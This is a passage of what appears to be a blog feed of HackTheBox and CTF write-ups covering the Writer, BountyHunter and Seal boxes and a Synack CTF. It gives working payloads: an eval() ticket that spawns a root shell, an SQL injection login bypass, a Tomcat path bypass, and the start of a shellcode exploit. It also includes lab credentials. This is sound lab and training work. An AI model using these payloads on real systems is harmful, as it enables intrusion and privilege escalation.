authentication-protected page for accounts creation at /accounts.php, but includes the actual contents of the page in the body of the response. This can hardly be noticed when using a web browser.  Crafted a request using the parameters identified in the /accounts.php page to create an account, which gave me admin access to the web app.  Found a ZIP file containing backup of the source code of the web application, analysis on which revealed a login credential of a locally-running MySQL server for the root user.  Tested the file upload functionality for web shells upload and execution, which failed because all uploaded files are stored in the backend MySQL server, not disk.  Identified a Command Injection flaw through static analysis of the downloaded source code backup. The file is /logs.php, which generates log messages for download. This was exploited to gain access to the host as www-data (the default apache2 web user).  Inside the host as www-data;          netstat identified a local MySQL server running, accessible using the MySQL credentials found in the configuration file in the site backup archive.      Found a password hash for a user named m4lwhere inside the previse database, cracked it using John the Ripper and the iconic rockyou.txt wordlist, and gained SSH access to the box.        Inside the host as m4lwhere;          Idenitifed a script that can be executed by the user with root privileges using sudo.      The script was found to be making a call to another binary using a relative path, which make it vulnerable to arbitrary code execution via $PATH tampering. This flaw was exploited to gain a root shell.      "
  },
  
  {
    "title": "Writer - HackTheBox",
    "url": "/posts/hackthebox/writer.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, web, sql injection, sqlmap, authentication bypass, command injection, enumeration, static analysis, arbitrary file upload, hash cracking, apt, lateral movement, python, django",
    "date": "2021-12-11 00:00:00 +0100",
    
    "snippet": "Writer is definitely one of the toughest boxes I have ever solved at the time of writing this. It features a website that is vulnerable to SQL injection, which leads to authentication bypass. Once you have access, there is a feature that allows you to add and edit stories, which is vulnerable to command injection in the filename, but will be tricky to spot without using the SQL injection flaw and reading the python code of the web application.Once inside the box, there are two local users, kyle, and john. Access to Kyle’s account was obtained after cracking a hash obtained from a local MySQL database. Once you have access as Kyle, you can exploit a write permission to /etc/postfix/disclaimer to move laterally to John’s account, and from there exploit another write permission to create a malicious configuration file that will be by apt through a cron job to gain code execution as root.InfoReconNMAP# Nmap 7.70 scan initiated Thu Oct 14 07:14:55 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.101Nmap scan report for 10.10.11.101Host is up (0.22s latency).Not shown: 995 closed portsPORT     STATE    SERVICE     VERSION22/tcp   open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80/tcp   open     http        Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_  Supported Methods: OPTIONS HEAD GET|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Story Bank | Writer.HTB139/tcp  open     netbios-ssn Samba smbd 4.6.2445/tcp  open     netbios-ssn Samba smbd 4.6.23809/tcp filtered apocdService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 14m21s, deviation: 0s, median: 14m21s| nbstat: NetBIOS name: WRITER, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| Names:|   WRITER&amp;lt;00&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;|   WRITER&amp;lt;03&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;|   WRITER&amp;lt;20&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;|   \\x01\\x02__MSBROWSE__\\x02&amp;lt;01&amp;gt;  Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;|   WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;|   WORKGROUP&amp;lt;1d&amp;gt;        Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;|_  WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2021-10-14 07:30:13|_  start_date: N/ARead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Oct 14 07:15:57 2021 -- 1 IP address (1 host up) scanned in 61.77 secondsA complete port scan didn’t yield any additional port.WebFound an email address admin@writer.htb in the about page;The contact us page has a form that appears to be non-responsive at first, but looking at my proxy, a request was actually made that returned a 404 Not found;Removing the PHP extension from the form submission path above resulted in a 200 response, but the response obtained is no different from the original page.Bruteforcing the web root using ffuf showed some interesting paths;The path /dashboard redirects to the homepage, which I am guessing is due to access control. The /administrative page provide a login page;Testing common usernames and passwords did not work. Bruteforcing the blog posts numeric ID did not reveal any hidden post.The /static page has directory listing, but nothing of interest was found inside;SMBAttaempting null authentication and intentionally wrong credentials kept giving me this error;Quick googling showed this could happen due to permission errors or non-existing shares. Since I don’t know any share name I assumed it was the latter.Using smbmap (Impacket), I was able to list some shares with null authentication, but I have access to none of them;Dumping the password policy of the SMB server using CrackMapExec, the server does not have any auto-locking policy for accounts, which means we can bruteforce creds with locking accounts;Bruteforce attampts with CrackMapExec kept giving false postives;I’m guessing the error is due to lack of SMBv1 support, which is what  hydra reported also;Even metasploit’s SMB login bruteforce module errored out;The Web Login FormThe login form at /administrative page is submitted via POST request with the parameters uname and password. Changing the request method to GET does not appear to affect the way the web app process the form. Deleting the password parameter raised a 500 INTERNAL SERVER ERROR, but deleting the uname parameter didn’t display any error. This indicate a difference in the way the two parameters are handled by the web application. Attempts to bruteforce the login page using the discovered email address admin@writer.htb, the username admin, and a wordlist made by crawling the web pages using CeWL didn’t work.Fuzzing the login parameter username with SQL Injection payloads worked, leading to a successful authentication bypass, which redirected me to the /dashboard page;DashboardIn the settings page, there is an option that allows the title, description, and logo of the site to be changed. This could be an interesting target for stored XSS when targeting other users, but I don’t think I need it since I can access all accounts using the SQL injection flaw in the login page.However, clicking the save button in the bottom of the page did not send any request. Going to the users page, it appears the only user account in the web app is that of the admin;Going into the stories page from the navigation menu, a list of all the stories were displayed, along with an option that allow stories to be updated;During this update, user can change the title, tagline, image, and content of the story;The image upload functionality validates uploaded files by checking the extension of the file submitted in the POST request, and rejects it if it doesn’t end with a .jpg extension. Saving a PHP file as test.jpg allows the file to be uploaded, but couldn’t be executed due to the extension not being .php;By changing the file extension to .jpg.php, the upload succeeded, which indicate the web app merely checks for the presence of .jpg in the filename;When the above script was requested, however, the server simply sends the file for download without executing it;I assumed it’s some .htaccess-like config preventing the server from executing the PHP file, so I tried testing the filename POST parameter for path traversal, which the web app is vulnerable to;Multple attempts to have the code executed did not work. Since the login page is vulnerable to SQL injection, I dumped the login request to a text file and passed it to sqlmap to work it’s magic.SQLMapAfter exporting the login request from Burp Suite, I passed it to sqlmap with the --threads=10 to speed things up a bit since it’s a blind SQL injection. It identified 2 databases in the server; information_schema, which is default for MySQL servers, and writer;Tables found in the writer database;After sqlmap screemed at me all the way about invalid characters, the table users was dumped successfully, which was found to contain hash of the user admin;The above hash looks corrupted since the inital length of the field as reported by sqlmap was 32 characters long, but after dumping, the hash in the CSV file was 37 characters long. This made sense since sqlmap warned me about reliability issues when using multiple threads for blind injections. So I used the --sql-shell argument to run specific SQL command that retrieve only the target hash;Although the hash looks like an MD5 hash, john identified it as multiple other formats, all of which were tested. But the hash could not be cracked.FootholdWith the admin  hash proving to be uncrackable, I went back to the file upload vulnerability on the admin dashboard. The path traversal vulnerability allows writing to top level directories that are writable to the web server user like /tmp and /dev/shm. Attempts to write to the default apache web root /var/www/html failed. Multiple command injection payloads in the filename parameter for the uploaded image also failed, and I just can’t get the server to execute uploaded PHP codes. So I moved on.Going back to the SQL injection using sqlmap, I realized I may be able to read local files using the --file-read argument. So I tested it by requesting /etc/hostname, and it worked. Since it’s a blind injection, the retrieval was slow and will be slower when dealing with larger files;SInce there is a path traversal vulnerability when editing stories in the admin dashboard that I couldn’t exploit to gain code execution as I couldn’t figure out the web root of the server, and I know the target is a linux host, I tried dumping  the file /etc/apache2/sites-enabled/000-default.conf, which is the default configuration file for Apache2, and will contain the web root. This was a very slow process with sqlmap, so I had to switch to manual SQL queries that use substring() to download chunks of the file, and it worked;And just like that, web root has been identified. The .wsgi is for python web applications, which explains some the difficulties I had enumerating paths earlier. Uploading a .php and a .txt files to the above path didn’t show any error message, but the uploaded files could not be requested. By checking the size of the uploaded files using the length(load_file(&#39;/path/to/file&#39;)), I verified the upload was successful. This is most likely a deadend because all requests to the path are being handled by the writer.wsgi script, and even if I managed to overwrite it, I will need to reboot the Apache server for the script to be loaded again. So I went back to all my previous findings in hope of finding something I missed earlier.The add new story feature in the admin page of the web app is the one thing I haven’t tested before;Going through the request it generated in Burp Suite, I noticed an empty parameter named image_url.  Adding any sort of value to the parameter result in a blank response from the server after it hangs for a few seconds;I needed to view the source code to understand what’s going on. The contents of the apache2 config file for enabled sites/vhosts showed /static path in the web app was mapped to /var/www/writer.htb/writer/static;Since /static is accessible in the web root of the website, that means /var/www/writer.htb/writer will likely be the root of the website. Reading up a bit on how python web apps handle paths, I learned that the file __init__.py is usually used to handle the path mappings of a directory. So I used SQLMap to dump the file, which will be at /var/www/writer.htb/writer/__init__.py in this case, and I got the python source code. Going through it, I found a possible command injection flaw on how the web app handles URL uploads when adding a story in the admin dashboard;The urlib.request.urlretrieve method returns two values, the path to which the given URL has been downloaded, which will be random name inside /tmp, and the headers returned. Notice that the the local_filename is injected directly into a system command used to move the image. Testing the urlretreive() function locally showed that it supports the file:// protocol, and that the returned local_filename when using the file:// protocol is not random, but the absolute path of the file on disk.With the above info, I was able to develop an RCE exploit for the web app after running multiple test locally on my python3 installation. By creating a story on the dashboard and setting the image name to;And the URL upload to;I got a reverse shell after sending the request;UserTwo local users were identified: john and kyle. Kyle got the user flag.Open ports;Going through the source file of the web application, I found a MySQL credential for the web app;The password did not give access to any of the local accounts on the host, nor the SMB service running on the host.Running linPEAS on the host, it found credential for the database named dev;I was able to connect to the dev database using the above credential, and found a hash for the user kyle;john is unable to load the hash when attempting to crack;Using haschat, the password was cracked successfully, which is marcoantonio. Using the credential, I gained access to the account of kyle over ssh;PrivEscUser kyle does not have sudo access on the host. However, he is a member of smbgroup, and filter. Attempting to access the SMB service using his credentials failed. Searching the filesystem for files with group smbgroup and filter, I found an interesting match for the filter group;The file /etc/postfix/disclaimer looks interesting, and I have write permission to it. I had to do a bit of reading online to know what it’s used for. I found out that for any email in /etc/postfix/disclaimer_addresses that send or receive mail, the file /etc/postfix/disclaimer will be executed. There are two (2) emails in the disclaimer_addresses file;This means all I need to do is inject a reverse shell in the disclaimer file, and send a message to any of the listed email addresses to gain code execution. Using nano and netcat, I was able to achieve this after a few tries as the box is restoring the contents of the disclaimer file frequently;The user john has SSH public key authentication configured, so I shipped his private key to my attack host for a more stable access over SSH.JohnI can’t list sudo permissions for this user as I still do not have his password. The user belongs to the group management. Searching for files belonging to the group, I got only one hit;Checking the outputs of pspy, I noticed a possible cron job that’s running apt-get update;After reading up on the purpose of /etc/apt/apt.conf.d, I learned that it is a directory used to store configuration files of APT. The files can be configured with commands be executed by apt on certain conditions. None of the existing files in the directory is writeable. But since all contents of the directory are treated as configuration files, and I have write access to directory, I created a simple configuration file (with a little help from https://blog.ikuamike.io/posts/2021/package_managers_privesc/) that execute a shell command when the apt update command was invoked;I then setup a listener, and wait for the update command to be executed by the cron task. It worked, and I got a reverse shell as root;Summary  Identfied running services using nmap  Found an admin panel by bruteforcing with ffuf  Exploited an SQL Injection flaw to bypass authentication.  Exploited a Command Injection flaw in the Add Story feature to gain a foothold into the box as www-data  Inside the box as www-data;          Found and cracked a hash for kyle in the backend MySQL database used by Django.      The hash gave me access to the box as kyle over SSH.        Inside the box as kyle;          The user belongs to the filter group, and have write permission on the  file /etc/postfix/disclaimer, which get executed when sending/receiving emails to/from certain addresses.      Injected a reverse shell into the file, and gained access to the box as the user john        Inside the box as john;          pspy identified a cron job that performs package update using apt-get update      john belong to the group management, which gave him write access to /etc/apt/apt.conf.d directory.      Created a malicious configuration file in /etc/apt/apt.conf.d that execute a reverse shell command when apt-get update was invoked, and gained access to the box as root.      "
  },
  
  {
    "title": "BountyHunter - HackTheBox",
    "url": "/posts/hackthebox/bountyhunter.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, web, xxe, lfi, static analysis, python, command injection, custom exploitation",
    "date": "2021-11-18 00:00:00 +0100",
    
    "snippet": "Another interesting easy linux box, Bounty Hunter is a box that features a web application that is vulnerable to XML External Entitiy injection. This flaw allows an attacker to read local files on the server, which can be used to download a PHP file that contains a username and password, which grants access to box over SSH.The privesc is a CTF-like challenge, where a custom script used to validate “tickets” is making a call to the exec() function of python with user-controlled data.Info  OS - Linux  Difficulty - Easy  Points - 20  Release - 24/Jul/2021  IP - 10.10.11.100ReconStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-26 09:09 WATStats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 50.00% done; ETC: 09:09 (0:00:06 remaining)Nmap scan report for 10.10.11.100Host is up (0.26s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.02 secondsSSH Server  Password login for root user allowed.Web ServerThere is a contact us form at the bottom of the home page that does not send any of the entered data, and result in the below response;The directory /resources/ has listing enabled, and contains a README.txt file;Bounty Report SystemThe form is submitted by a custom JavaScript code defined in the file resources/bountylog.js;function returnSecret(data) {  return Promise.resolve($.ajax({            type: &quot;POST&quot;,            data: {&quot;data&quot;:data},            url: &quot;tracker_diRbPr00f314.php&quot;            }));}async function bountySubmit() {  try {    var xml = `&amp;lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;    &amp;lt;bugreport&amp;gt;    &amp;lt;title&amp;gt;${$(&#39;#exploitTitle&#39;).val()}&amp;lt;/title&amp;gt;    &amp;lt;cwe&amp;gt;${$(&#39;#cwe&#39;).val()}&amp;lt;/cwe&amp;gt;    &amp;lt;cvss&amp;gt;${$(&#39;#cvss&#39;).val()}&amp;lt;/cvss&amp;gt;    &amp;lt;reward&amp;gt;${$(&#39;#reward&#39;).val()}&amp;lt;/reward&amp;gt;    &amp;lt;/bugreport&amp;gt;`    let data = await returnSecret(btoa(xml));      $(&quot;#return&quot;).html(data)  }  catch(error) {    console.log(&#39;Error:&#39;, error);  }}Generated request sample;Nothing in the JavaScript code indicate any input validation, nor  in the HTML code of the form;Since all the user-controlled parameters are directly used to construct and XML code that is passed to the server as a base64-encoded data, XML injection flaws may arise during parsing by the backend.Injecting a new parameter age;The decoded XML;The server only responded with attributes it is interested in, and ignored the injected one, but seeing the title parameter in the response indicated our injection was successful, and didn’t break the backend parser.First attempt to read a local file returned blank attributes;Since the client-side JS code sends out a complete XML code, and not just user-given parameters, the encoded XML data generated was replaced (using an intercepting proxy) with an XML entity that will include a local file in the response;Remote File Inclusion payload also worked;FootholdUsing the XXE vulnerability discovered on the web application, a local user account was discovered with the username codex;Attempt to read the user flag, which should be located at /home/codex/user.txt was unsuccessful.After calling it a night and continuing the next day, the discovered codex user no longer exist in the /etc/passwd file. The account was most likely created by another tester. But the development  account still exist;The flag of this user is also not readable, and attempts to read the source code of the web application in hope of finding something kept kept failing.After a while of frustration, I figured the contents of some files are likely breaking the XML syntax, so I test if the web app allows for base64 encoding of target data using PHP, and it does. The output shown below is the base64-encoded content of /etc/passwd;Since I can now read all readable files, I went back to fuzzing for hidden files with ffuf, and discovered an interesting file in the web root named /db.php;Dumping the file using the XXE exploit revealed a credential;&amp;lt;?php// TODO -&amp;gt; Implement login system with the database.$dbserver = &quot;localhost&quot;;$dbname = &quot;bounty&quot;;$dbusername = &quot;admin&quot;;$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;$testuser = &quot;test&quot;;?&amp;gt;Since a user was previously discovered with the username development, and an SSH server is running on the host, the password was tested on the SSH server, and it was successful;PrivEscThe user development has sudo access to /opt/skytrain_inc/ticketValidator.py;#Skytrain Inc Ticket Validation System 0.1#Do not distribute this file.def load_file(loc):    if loc.endswith(&quot;.md&quot;):        return open(loc, &#39;r&#39;)    else:        print(&quot;Wrong file type.&quot;)        exit()def evaluate(ticketFile):    #Evaluates a ticket to check for ireggularities.    code_line = None    for i,x in enumerate(ticketFile.readlines()):        if i == 0:            if not x.startswith(&quot;# Skytrain Inc&quot;):                return False            continue        if i == 1:            if not x.startswith(&quot;## Ticket to &quot;):                return False            print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;)            continue        if x.startswith(&quot;__Ticket Code:__&quot;):            code_line = i+1            continue        if code_line and i == code_line:            if not x.startswith(&quot;**&quot;):                return False            ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0]            if int(ticketCode) % 7 == 4:                validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;))                if validationNumber &amp;gt; 100:                    return True                else:                    return False    return Falsedef main():    fileName = input(&quot;Please enter the path to the ticket file.\\n&quot;)    ticket = load_file(fileName)    #DEBUG print(ticket)    result = evaluate(ticket)    if (result):        print(&quot;Valid ticket.&quot;)    else:        print(&quot;Invalid ticket.&quot;)    ticket.closemain()Code Logic for ticketValidator.py  Ask user for ticket file name.  Verify that the file ends with .md, and open it for reading.  Pass the opened file to evaluate()          Ensure the first line starts with # Skytrain Inc      Ensure the second line starts with ## Ticket to , and print the ticket recipient.      Loop until a line starting with __Ticket Code:__ is found, and save the index of the line after it as code_line.                  Ensure that the line with the index code_line start with **.          Strip the ** found in the line, and split the line at first occurrence of + and save the data to the left as ticketCode.          Convert ticketCode to int, and test if a remainder of 4 is obtained after dividing the value by 7 (ticketCode % 7 == 4).          If the above is true, strip all ** in original code line and pass it to python’s eval() function.                    The eval() method is dangerous when used to process unsanitized data. After testing the logic in a local python3 installation, I was able to build the below ticket that launch a bash shell when processed by the Ticket Validator;# Skytrain Inc## Ticket to someHacker__Ticket Code:__**11 + int(exec(&#39;import os; os.system(&quot;/bin/bash&quot;)&#39;) == 1)Using scp, I copied the above ticket to /tmp/privesc_ticket.md on the target host, and was able to get root on first attempt ;)Summary  Identified SSH and HTTP services using nmap  /log_submit.php provides a form submitted in a POST request as base64-encoded XML with no client-side validation. Testing revealed an exploitable XXE vulnerability.  Using the XXE flaw;          Identified a local user named development.      Download source code of previously discovered PHP file /db.php, which contain password that allowed SSH access to the development account.        With SSH access to the development account;          Found a custom ticket validation script written in python that can be executed as root using sudo.      Shipped the script to my attack host for analysis.                  Discovered a dangerous call to python’s eval() function with user-controlled data.          Crafted a malicious ticket file to spawn a bash shell on the host as root                    "
  },
  
  {
    "title": "Seal - HackTheBox",
    "url": "/posts/hackthebox/seal.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, web, apache tomcat, web proxy, git, gitbucket, open signup, path normalization, ansible playbook",
    "date": "2021-11-13 00:00:00 +0100",
    
    "snippet": "Seal is a medium linux box. It features a web service on port 443 running Apache Tomcat, and a GitBucket installation running locally, but accessible through the proxy on port 8080 (nginx). The GitBucket allows a user to create an account, which I did. Once inside, I recovered a password in a previous commit in one of the repositories. This credential was accepted by the tomcat admin login page, but access to the panel was blocked by nginx. This was bypassed thanks to a path normalization vulnerability, and the .war upload used to deploy web applications in tomcat was used to gain code execution on the server.Once inside, two different exploits targeting ansible-playbook were used, first to move laterally, and second to gain code execution as root.InfoReconNMAP# Nmap 7.70 scan initiated Sat Oct  9 15:30:06 2021 as: nmap -sV -sC -p22,443,8080 -oN nmap.txt 10.10.10.250Nmap scan report for seal.htb (10.10.10.250)Host is up (0.71s latency).PORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Seal Market| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK| Not valid before: 2021-05-05T10:24:03|_Not valid after:  2022-05-05T10:24:03| tls-alpn: |_  http/1.1| tls-nextprotoneg: |_  http/1.18080/tcp open  http-proxy| fingerprint-strings: ---[snip]---| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_  Server returned status 401 but no WWW-Authenticate header.|_http-title: Site doesn&#39;t have a title (text/html;charset=utf-8).1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :---[snip]---SF:);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Oct  9 15:30:45 2021 -- 1 IP address (1 host up) scanned in 38.91 secondsWeb ServiceThe web page looks quite nice for a HTB box, and Wappalyzer detected about 11 web technologies. Going through the links showed that almost all of them are dead.One thing I noticed is the lack of web service running on port 80, but a HTTPs service on port 443. The NMAP scan identified the web server as nginx 1.18.0, but the server was later identified as Apache Tomcat 9.0.31 during manual probing to determine if the server uses PHP;The search field in the homepage generate the below GET request;Continuous fuzzing of the Vegetable parameter showed above made no difference on response received, indicating the web page might be static.Bruteforcing with gobuster failed, citing SSL certificate errors (I later found out that it need the -k argument to disable TLS validation). ffuf worked and discovered some interesting pages;The page /dashboard/ looks promising, but all the links are dead;The response code of 304, which is for unmodified contents and used for caching, indicate it’s probably just a static page;Another page of interest is /admin, which on request redirected me to http://seal.htb/admin/, which failed because the NMAP scan earlier showed no service running on port 80. Since NMAP previously identified a web proxy on port 8080, I enabled this proxy in Firefox using the FoxyProxy plugin, and gained access to the page;Guessing common username and passwords didn’t work. Using the create account link, I created an account with the username testuser and password testpass, and was able to login;Using the repository search feature, I discovered a user named root with 2 repos. Going through the repos of root, I found another user named alex;The seal_market repo owned by root is of interest as it’s contents match that of the web page at https://seal.htb/. It also contains the name of the box, and some administrative todo list in the README file;Another user named luis was also identified while going through this repo, bringing the count of discovered users to 3 (root, luis, and alex).Going through the users homepages, the user  root has the highest entries in activity log. One commit stands out as it mentioned an update to Tomcat’s configuration file;Viewing the commit log showed a credential;Another commit in the seal_market repo showed some config for the nginx reverse proxy with the path /manager/html. Request for /manager forces redirect to /manager/html, which showed a 403 Forbidden response;A bit of googling on the variable $ssl_client_verify showed it is used by nginx to store the result of an SSL certificate verification for the client. Since I am getting a 403, the above config indicate I may have failed the validation or something else. I am not sure. These are all very interesting info, but I have no clue how to exploit them.GitBucketFocusing more on the GitBucker users discovered, I noticed that alex is the admin of the infra repo, luis is a core developer, and root is well… root.Earlier I found a credential for the user tomcat while going through the activity log of the root user. Testing the password against all the three users found, I gained access to the account of luis;No any private repo was found inside Luis’ homepage, and the last activity of the account was on 5 May, which make me believe I am going at it the wrong way.Seal MarketWhile requests for https://seal.htb/dashboard/ succeeded, any other request to a path through Burp Suite gave me the error;Without Burp Suite, request for https://seal.htb/admin/dashboard/ showed 403 Forbidden, while any other path showed the error;Going back to the /manager/ path discovered earlier. I got this very informative error when requesting a random path;Requesting the /manager/text path gave me an authentication prompt;The Tomcat Manager Application prompt made me remember the previous credential obtained from the GitBucket repository, which is tomcat:42MrHBf*z8{Z%. I was able to login using the credential, but got the following message;I imagined the above message is because I am accessing the page from a foreign host, so I tried to use the HTTP proxy on port 8080 to access the page, but it didn’t work.I then started testing the HTTP proxy for HTTP request smuggling attacks, which is an attack I had to learn on the fly, and it didn’t work as the proxy blocks the use of both Content-Length and Transfer-Encoding headers in a single request, which the method I was trying depends on. Some bypass techniques that include adding a whitespace in front of the header name, and a tab in front of the header value, were also detected by the proxy, and blocked;With that method down the drain, I started googling on how to bypass that 403 code. I tried quite a few of the methods, some of which were implemented in scripts hosted on Github, and none worked. I was running out of ideas at this point.I went fully manual using Burp Suite and researching ways to bypass that 403, as I was quite confident this should work due to the presence of the reverse proxy. After lots of trials and errors, I found an article on Acunetix about a path normalization vulnerability when accessing Apache Tomcat using Nginx as a reverse proxy;Using the path /manager/..;/manager/html, which the nginx proxy let through as it does not match it’s rule for /manager/html, and Apache Tomcat normalize to /manager/html, I was able to bypass the 403 error and access the page. AT LAST!!!Tomcat ManagerWith access to the Tomcat Manager, I gained access to a .war file upload functionality;Since .war files are used to package .jsp web apps, I found a webshell on Github, uploaded it, and deployed it on the server;Going to https://seal.htb/webshell gave me a foothold into the box as the tomcat user, which I used to spawn a bash reverse shell back to my attack box;UserWith command execution inside the box as tomcat, it’s time to upgrade to a user account. A local user named luis was found, and inside his home is the user flag which is not readable to us.Moving through the filesystem to find something of interest, I found some directories inside /opt/backups, which are playbook and arhives. The archives contains some .gz archives, while the playbook contains a file named run.yml;- hosts: localhost  tasks:  - name: Copy Files    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes  - name: Server Backups    archive:      path: /opt/backups/files/      dest: &quot;/opt/backups/archives/backup--.gz&quot;  - name: Clean    file:      state: absent      path: /opt/backups/files/Dumping a list of all running processes indicate the program ansible-playbook is being executed by a cron job as luis with the above .yml file as an argument, likely after every 30 seconds judging from the sleep 30 instruction;After reading up a bit about ansible, the above .yml file begins to make sense; It is used to copy all files inside the directory defined in the src parameter into dst, including files pointed to by symbolic links (copy_links=yes).The upper/root part of source directory is not writeable to the tomcat user. Looking at the inner files, however, I noticed the uploads folder is writable to everyone;Since there is a .ssh directory in the home of the user luis, it is likely this user has SSH public key authentication configured, so I moved into the writeable uploads directory and create a symlink to the SSH private key, which will be at /home/luis/.ssh/id_rsa. This is possible because you don’t need any permission on a file before you can create a symlink to it;I then monitor the /opt/backups/archives for a new file to pop up, and one did. I immeditaley copied it /dev/shm/.0 and extract it. Inside the extracted uploads directory, I found the id_rsa file containing the private key of luis;I shipped the key file to my attack host using netcat and gained access to the box over SSH as luis;PrivEscInside the host as luis, I have permission to run /usr/bin/ansible-playbook with any argument as root using sudo. Since this is a standard program, I look it up in https://gtfobins.github.io, and got a hit;Using the above payload, I gained root on the box;This is my fastest privilege escalation on HackTheBox at the time of writing this.Summary  Identified port 22, 443, and 8080 using nmap  Bruteforced the web service on port 443 for hidden paths, and found /dashboard/  Discovered /admin/ web service on port 443, which redirect to http://seal.htb/admin/, which lead me to a GitBucket installation using the proxy on port 8080.  Inside GitBucket;          Found 3 users: root, alex, and luis.      Found a credential for tomcat user. Using the password, gained access to luis account on the GitBucket server.        Used the tomcat credential for a web login at https://seal.htb/manager/text, which succeeded, but access was blocked by nginx reverse proxy.  Expoited a path normalization vulnerability to gain access to /manager/html.  Used the .war file upload functionality to upload a webshell and gain foothold into the box as the user tomcat.  Inside the box as tomcat;          Identified a cron job that uses ansible-playbook and a configuration file to copy files to a directory, resolving all symlinks in the process.      Exploited the copy operation to have ansible-playbook fetch a user’s SSH private key, which I used to gain access to the box over SSH as the user luis.        Inside the box as luis;          Identified a sudo permission to run ansible-playbook with any argument as root.      Found a privilege escalation exploit on https://gtfobins.github.io, which gave me root access to the box.      "
  },
  
  {
    "title": "Synack Red Team 5 CTF",
    "url": "/posts/ctf/synack5.html",
    "categories": "ctf",
    "tags": "ctf, synack red team, hackthebox, jeopardy, template injection, sql injection, command injection, rsa, pwn, traffic analysis, static analysis, reverse engineering",
    "date": "2021-11-08 00:00:00 +0100",
    
    "snippet": "Synack Red Team 5 CTF was (iirc) my third CTF, and the first in which I actually managed to score some decent points. It’s a jeopardy-styled CTF featuring 6 categories (web, pwn, crypto, forensics, misc, and reversing). I managed to solve 16 out of the 25 total challenges, solving at least one challenge in each category. My strongest category was web, in which I solved 5 out of 6 challenges. I eventually finished 46th out of 333 participants, which was narrowly within my target of top 50, and for that I am happy :)WebSimPlayThis was a web challenge with downloadable source code. Going through the source files, the file TimeModel.php was found to be making a call to eval() using user-controlled data that was passed to it by TimeController.phpI exploited this to identify, and read the flag;PotentQuotesThis challenge featured a login form asking for username and password. The username field was vulnerable to SQL Injection, and authentication was bypassed using the payload admin&#39; or 1=1-- -.BoneChewerConeThe website in this challenge was vulnerable to Server Side Template Injection (SSTI). The flag was found in the output of config.items()IMF - LandingThis was a fun web challenge that features Local File Inclusion (LFI) vulnerability in the website served by Nginx. It was a PHP site, and I was able to gain code execution by chaining the LFI with log poisoning to execute PHP payloads;IMF - The SearchThe website in this challenge had a feature that allowed users to search for “agents”. It was NodeJS application, and it’s vulnerable to Server Side Template Injection (SSTI) using the pug engine;Using some node tutorials to execute shell commands, I was able to craft a payload to execute a shell command on the host, but I could not get it to return any output. Attempts to redirect output to local files so I can read it using GET requests were unsuccessful as the server appeared to be only allowing requests to paths with existing mappings.I was eventually able to read output by overwriting the site’s logo, and then viewing it using curl;CryptoWeak RSAThis is a downloadable challenge that provide a public key, and an encrypted message. Using the program https://github.com/Ganapati/RsaCtfTool, and openssl, I was able to decrypt the message after recovering the private key;ReversingAccessThis was a simple reversing challenge that I solved by patching the binary using cutter, forcing it to continuously execute the block of code that compares user input to the hidden key, which I extracted one character at a time;CheckThis challenge provides a binary that compares user input to a value. I was able to solve this by setting a breakpoint where the comparison was carried out, and dumping the data at the memory location using radare2;SplitThe binary in this challenge tests user input against an encrypted string. The encrypted string is decrypted just before the comparison was made, and I was able to dump it by setting a breakpoint at the location;PwnInjectionThis challenge provides a downloadable binary and a TCP service through which the program can be accessed using tools like netcat. The downloaded binary gives an address during interaction with user, which was found to be the address of a buffer used to store user input without checking size, leading to buffer overflow;So I crafted an exploit in python that inject shellcode in the input buffer, and used the given address to overwrite the instruction pointer;#!/usr/bin/python3from time import sleepimport socketfrom binascii import unhexlifyshellcode = open(&quot;dash.bin&quot;, &quot;rb&quot;).read() # A 64-bit /bin/sh shellcodepadding = 